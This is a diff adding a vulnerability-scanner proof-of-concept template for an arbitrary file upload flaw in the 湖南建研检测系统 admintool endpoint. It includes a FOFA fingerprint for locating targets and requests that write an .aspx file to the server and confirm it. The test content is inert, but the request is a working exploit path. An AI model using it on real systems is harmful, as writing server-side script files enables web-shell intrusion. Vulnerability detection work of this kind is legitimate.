@@ -1,0 +1,22 @@
+id: poc-yaml-hunanjianyan-detection-system-admintool-anyfile-upload
+info:
+  name: 湖南建研检测系统 admintool 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 湖南建研检测系统
+  fofa: body="/Content/Theme/Standard/webSite/login.css"
+variables:
+  t1: random_str(6)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /Scripts/admintool?type=updatefile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filePath={{.t1}}.aspx&fileContent={{.t2}}
+  expression: status_code == 200 && contains(body,"创建文件成功")
+- method: GET
+  path: /Scripts/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
